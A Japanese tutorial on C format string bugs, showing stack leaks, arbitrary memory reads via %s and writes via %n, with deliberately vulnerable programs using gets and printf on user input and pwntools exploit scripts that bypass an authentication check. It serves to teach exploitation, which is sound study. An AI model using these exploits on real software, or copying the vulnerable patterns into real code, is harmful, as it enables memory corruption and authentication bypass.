---
description: スタックからメモリを読み取る
---

# 書式文字列バグ(Format String Bug)

書式文字列(Format String)は、悪用しやすい危険なバグです。うまく操作すれば、任意のメモリ位置への読み書きといった強力な操作が可能になります。

### なぜ存在するのか

C では、一部の関数が文字列内に「書式指定子(format specifier)」を取れます。例を見てみましょう。

```c
int value = 1205;

printf("Decimal: %d\nFloat: %f\nHex: 0x%x", value, (double) value, value);
```

出力は次のようになります。

```text
Decimal: 1205
Float: 1205.000000
Hex: 0x4b5
```

このように、`%d` は値に、`%f` は浮動小数点の値に、`%x` は 16 進表現に置き換えられました。

これは C で文字列を整形する便利な方法です(C では文字列の連結はかなり面倒です)。同じ値を 16 進数で 3 回出力してみましょう。

```c
int value = 1205;

printf("%x %x %x", value, value, value);
```

期待どおりの結果になります。

```text
4b5 4b5 4b5
```

では、書式指定子の数に対して_引数が足りない_とどうなるでしょうか?

```c
int value = 1205;

printf("%x %x %x", value);
```

```text
4b5 5659b000 565981b0
```

えっと...何が起きたのでしょうか?

重要なのは、`printf` は書式指定子と同じ数のパラメータがあると期待しており、32 ビットではそのパラメータをスタックから取り出すという点です。スタックに十分なパラメータがなければ、単に_次の値を取り出して_しまいます。つまり実質的に_スタックの値をリークして_しまうのです。これが書式文字列バグが危険な理由です。

### どう悪用するか

コードのバグなら、攻撃者にできることは大してないのでは? 実は本当の問題は、C のコードがユーザーの入力をそのまま `printf` で出力する場合に起こります。

{% file src="../../.gitbook/assets/fmtstr\_arb\_read.zip" caption="Format String" %}

```c
#include <stdio.h>

int main(void) {
    char buffer[30];
    
    gets(buffer);

    printf(buffer);
    return 0;
}
```

通常どおり実行すると、期待どおりに動作します。

```text
$ ./test 

yes
yes
```

では、`%x` のような書式指定子を入力するとどうなるでしょうか?

```text
$ ./test

%x %x %x %x %x
f7f74080 0 5657b1c0 782573fc 20782520
```

開発者がこれほど多くの書式指定子を想定していなかったため、スタックから値を読み出して返してしまいます。

### オフセットの選択

同じ値を 3 回出力するのに、次のように書くと

```c
printf("%x %x %x", value, value, value);
```

面倒になります。そこで C にはもっと良い方法があります。

```c
printf("%1$x %1$x %1$x", value);
```

間にある `1$` は、printf に**最初のパラメータ**を使うよう指示します。しかしこれは、攻撃者がスタックの先頭から任意のオフセット位置の値を読めることも意味します。たとえば 6 番目の `%p` にカナリアがあるとわかっていれば、`%p %p %p %p %p %p` と送る代わりに `%6$p` と送るだけで済みます。これでずっと効率的になります。

### 任意読み取り

C では、文字列を使うとき、文字列の先頭への**ポインタ**を使います。これは本質的にメモリアドレスを表す値です。したがって `%s` 書式指定子を使うと、渡されるのは_ポインタ_です。つまり、スタックから値を読み取る代わりに、_そのポインタが指すメモリアドレスの値_を読み取ります。

これは確かに_興味深い_のですが、読みたい場所に対応する値がたまたまスタックにあれば、の話です。では、読みたい場所を自分で指定できたらどうでしょうか? 実は、できます。

先ほどのプログラムとその出力をもう一度見てみましょう。

```text
$ ./test

%x %x %x %x %x %x
f7f74080 0 5657b1c0 782573fc 20782520 25207825
```

最後の 2 つの値に、`%x` の 16 進値が含まれていることに気づくかもしれません。これはバッファを読んでいるからです。ここではバッファは 4 番目のオフセットにあります。アドレスを書き込んで `%s` でそれを指せば、任意読み取りができます!

```text
$ ./vuln 

ABCD|%6$p
ABCD|0x44434241
```

{% hint style="info" %}
`%p` はポインタです。一般に `%x` と同じ結果を返しますが、先頭に `0x` が付くので目立ちやすくなります。
{% endhint %}

ご覧のとおり、入力した値を読み取れています。ELF ファイルの場所を書き込み、それを `%s` で読み取る pwntools スクリプトを簡単に書いてみましょう。うまくいけば、ファイルの最初のバイト(常に `\x7fELF`)が読み取れるはずです。まず基本から始めます。

```python
from pwn import *

p = process('./vuln')

payload = p32(0x41424344)
payload += b'|%6$p'

p.sendline(payload)
log.info(p.clean())
```

```text
$ python3 exploit.py

[+] Starting local process './vuln': pid 3204
[*] b'DCBA|0x41424344'
```

うまく動きました。バイナリのベースアドレスは `0x8048000` なので、`0x41424344` をそれに置き換えて `%s` で読み取ってみます。

```python
from pwn import *

p = process('./vuln')

payload = p32(0x8048000)
payload += b'|%6$s'

p.sendline(payload)
log.info(p.clean())
```

うまくいきません。

原因は、`printf` が null バイトで止まるためで、最初の文字がまさに null バイトだからです。書式指定子を先頭に置く必要があります。

```python
from pwn import *

p = process('./vuln')

payload = b'%8$p||||'
payload += p32(0x8048000)

p.sendline(payload)
log.info(p.clean())
```

ペイロードを分解してみましょう。

* `|` を 4 つ追加するのは、書き込むアドレスが、あるメモリアドレスの半分と次のアドレスの半分にまたがるのではなく、ちょうど 1 つのアドレスに収まるようにするためです。またがると、間違ったアドレスを読むことになります。
* オフセットが `%8$p` なのは、バッファの先頭が通常 `%6$p` にあるためです。ただしメモリアドレスは 1 つあたり 4 バイトで、すでに 8 バイトあるので、2 つ先の `%8$p` になります。

```text
$ python3 exploit.py

[+] Starting local process './vuln': pid 3255
[*] b'0x8048000||||'
```

> それでも null バイトで止まりますが、出力が得られているので問題ありません。アドレスはメモリに書き込まれており、ただ出力されないだけです。

次に `p` を `s` に置き換えます。

```text
$ python3 exploit.py

[+] Starting local process './vuln': pid 3326
[*] b'\x7fELF\x01\x01\x01||||'
```

もちろん `%s` も、C の文字列は null で終端されるため、null バイトで止まります。しかし、ELF ファイルの先頭から null バイトまでが `\x7fELF\x01\x01\x01` であることはこれでわかりました。

### 任意書き込み

幸い、C には、あまり使われない書式指定子 `%n` があります。これはポインタ(メモリアドレス)を受け取り、そこへ_これまでに出力した文字数_を書き込みます。入力を制御できれば、出力する文字数も、書き込む場所も制御できます。

もちろん、_ちょっとした_問題があります。たとえば `0x8048000` をメモリアドレスに書き込むには、その数だけ文字を出力しなければならず、普通バッファはそれほど大きくありません。幸い、そのための別の書式指定子があります。完全に理解するために、[この動画](https://www.youtube.com/watch?v=t1LH9D5cuK4)をぜひ見てください。ここでは基本的なバイナリに進みます。

{% file src="../../.gitbook/assets/fmtstr\_arb\_write.zip" caption="Format String - Arbitrary Write" %}

```c
#include <stdio.h>

int auth = 0;

int main() {
    char password[100];

    puts("Password: ");
    fgets(password, sizeof password, stdin);
    
    printf(password);
    printf("Auth is %i\n", auth);

    if(auth == 10) {
        puts("Authenticated!");
    }
}
```

単純です。変数 `auth` を値 10 で上書きする必要があります。書式文字列の脆弱性は明らかですが、安全な `fgets` を使っているのでバッファオーバーフローはありません。

#### auth の場所を調べる

グローバル変数なので、バイナリ自体の中にあります。`readelf` でシンボルを調べれば場所がわかります。

```text
$ readelf -s auth | grep auth
    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS auth.c
    57: 0804c028     4 OBJECT  GLOBAL DEFAULT   24 auth
```

`auth` の場所は `0x0804c028` です。

#### エクスプロイトを書く

幸い null バイトがないので、順序を入れ替える必要はありません。

```text
$ ./auth 

Password: 
%p %p %p %p %p %p %p %p %p
0x64 0xf7f9f580 0x8049199 (nil) 0x1 0xf7ff5980 0x25207025 0x70252070 0x20702520
```

バッファは 7 番目の `%p` です。

```python
from pwn import *

AUTH = 0x804c028

p = process('./auth')

payload = p32(AUTH)
payload += b'|' * 6         # 10 を書き込む必要があり、AUTH が 4 バイトなので、%n 用にあと 6 バイト必要
payload += b'%7$n'


print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))
```

あっさり成功しました。

```text
[+] Starting local process './auth': pid 4045
Password: 

[*] Process './auth' stopped with exit code 0 (pid 4045)
(À\x04||||||
Auth is 10
Authenticated!
```

### pwntools

想像のとおり、pwntools には `%n` の書式文字列エクスプロイトを自動化する便利な機能があります。

```python
payload = fmtstr_payload(offset, {location : value})
```

この場合の `offset` は `7` です。7 番目の `%p` がバッファを読んでいるためです。location は**どこ**に書くか、value は**何を**書くかです。辞書には location と value のペアをいくつでも追加できます。

```python
payload = fmtstr_payload(7, {AUTH : 10})
```

pwntools では `auth` シンボルの場所を取得することもできます。

```python
elf = ELF('./auth')
AUTH = elf.sym['auth']
```

> pwntools のチュートリアルで、ほかにも便利な機能を確認してみてください。

